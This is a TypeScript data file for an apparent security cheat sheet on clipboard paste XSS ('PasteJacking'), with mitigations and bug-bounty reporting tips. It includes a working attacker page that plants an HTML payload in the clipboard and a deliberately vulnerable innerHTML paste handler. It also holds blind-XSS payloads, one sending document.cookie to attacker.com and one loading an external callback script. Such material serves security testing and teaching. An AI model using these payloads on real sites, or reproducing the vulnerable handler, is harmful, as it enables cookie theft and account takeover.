export interface PasteJackingCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const pasteJackingCategories: PasteJackingCategory[] = [
  {
    category: "Introduction",
    commands: [
      { command: "Clipboard Paste XSS (PasteJacking) occurs when a web app accepts HTML content from the clipboard during a paste event and inserts it directly into the DOM using innerHTML without sanitization.", description: "Lesser-known XSS variant that exploits how apps handle pasted content from the user's clipboard." },
    ],
  },
  {
    category: "Attack Flow — Attacker Prepares Malicious Page",
    commands: [
      { command: `<!doctype html>
<html><head><title>Super Sale - Coupons</title></head>
<body>
<div class="card"><h1>Mega Sale Coupon</h1>
<p>Click to copy your exclusive coupon code!</p>
<button id="copy">Copy Coupon</button></div>
<script>
const htmlPayload = '<img src=x onerror="alert(\'XSS via paste\')">';
document.getElementById('copy').addEventListener('click', () => {
  const onCopy = e => {
    e.clipboardData.setData('text/html', htmlPayload);
    e.clipboardData.setData('text/plain', 'SALE2025');
    e.preventDefault();
    document.removeEventListener('copy', onCopy);
  };
  document.addEventListener('copy', onCopy);
  document.execCommand('copy');
  alert('Coupon copied! Paste it into the store checkout box.');
});
</script></body></html>`, description: "#1 Attacker page — copies HTML payload + plain text to clipboard. Victim sees 'SALE2025' but hidden HTML payload is also stored." },
    ],
  },
  {
    category: "Attack Flow — Victim Pastes on Vulnerable Site",
    commands: [
      { command: `element.addEventListener('paste', e => {
  const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
  e.preventDefault();
  element.innerHTML = html; // Dangerous
});`, description: "#2 Vulnerable paste handler — reads text/html from clipboard, inserts directly with innerHTML. Payload executes immediately." },
    ],
  },
  {
    category: "Attack Flow — Blind XSS Scenario",
    commands: [
      { command: "If victim's paste stores the payload (comment, ticket) and an admin later views it → XSS fires in admin's browser. Attacker gets callbacks but never sees the page.", description: "#3 Blind XSS — attacker uses callback payloads instead of alert()" },
      { command: "const htmlPayload = '<img src=x onerror=\"fetch(\\'https://attacker.com/log?c=\\'+document.cookie)\">';", description: "Blind XSS payload — exfiltrate cookies to attacker server" },
      { command: 'const htmlPayload = \'"><script src=https://xss.report/c/coffinxp></script>\';', description: "Blind XSS via external script — use xss.report or interactsh" },
    ],
  },
  {
    category: "Proof of Concept — Vulnerable Page (victim.html)",
    commands: [
      { command: `<!doctype html>
<html><head><title>Checkout - Apply Coupon</title></head>
<body>
<div class="checkout-box"><h2>Apply Your Coupon</h2>
<div id="box" contenteditable="true"></div>
<p>Click inside the box and press Ctrl+V to paste your coupon.</p></div>
<script>
const box = document.getElementById('box');
box.addEventListener('paste', e => {
  const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
  e.preventDefault();
  box.innerHTML = html; // Vulnerable
});
</script></body></html>`, description: "PoC victim page — contenteditable div with vulnerable paste handler. Open copy.html → click Copy → paste into victim.html → XSS fires." },
    ],
  },
  {
    category: "Where to Test in Real Applications",
    commands: [
      { command: "Comment systems with formatting options", description: "#1 Rich text editors in blog/CMS comment sections" },
      { command: "Chat or messaging platforms that allow rich text", description: "#2 Slack-like apps, support chat, CRM messaging" },
      { command: "Support ticket or CRM tools", description: "#3 Ticket description fields with WYSIWYG editors" },
      { command: "CMS admin panels (content editors)", description: "#4 WordPress, Drupal, Joomla admin interfaces" },
      { command: "Won't work in simple <input> or <textarea> — those only accept plain text.", description: "Only affects contenteditable divs or rich-text editors that read text/html" },
    ],
  },
  {
    category: "Mitigation Strategies",
    commands: [
      { command: `element.addEventListener('paste', e => {
  e.preventDefault();
  const text = e.clipboardData.getData('text/plain');
  element.textContent = text; // Safe
});`, description: "#1 Force plain-text paste — use textContent instead of innerHTML" },
      { command: "const clean = DOMPurify.sanitize(html); element.innerHTML = clean;", description: "#2 Sanitize HTML with DOMPurify if rich text is required" },
      { command: "Content-Security-Policy: script-src 'self'; block data: and javascript: URLs", description: "#3 Strong CSP — disallow inline scripts and dangerous URL schemes" },
      { command: "Educate developers — paste events can contain HTML, not just plain text.", description: "#4 Developer awareness is the first step to prevention" },
    ],
  },
  {
    category: "Reporting Tips (Bug Bounty / Pentest)",
    commands: [
      { command: "1. Steps to reproduce (attacker PoC + paste action) 2. Screenshots/video showing XSS firing 3. Impact statement: highlight Blind XSS in admin panels 4. Suggested fix: enforce plain text or sanitize HTML", description: "Complete report template for PasteJacking XSS findings" },
    ],
  },
  {
    category: "Conclusion",
    commands: [
      { command: "Clipboard Paste XSS (PasteJacking) exploits paste actions to trigger XSS. Rich-text editors and admin panels are common targets. Recognizing this helps bug hunters find Blind XSS and guides developers to implement safer paste handling.", description: "Lesser-known but powerful XSS variant — test contenteditable fields and WYSIWYG editors with HTML clipboard payloads" },
    ],
  },
]

export const pasteJackingTools = [
  { name: "DOMPurify", url: "https://github.com/cure53/DOMPurify", description: "HTML sanitization library — prevents XSS from clipboard paste" },
  { name: "xss.report", url: "https://xss.report", description: "Blind XSS callback service for receiving XSS triggers" },
  { name: "Interactsh", url: "https://github.com/projectdiscovery/interactsh", description: "Out-of-band interaction tool for blind XSS detection" },
]
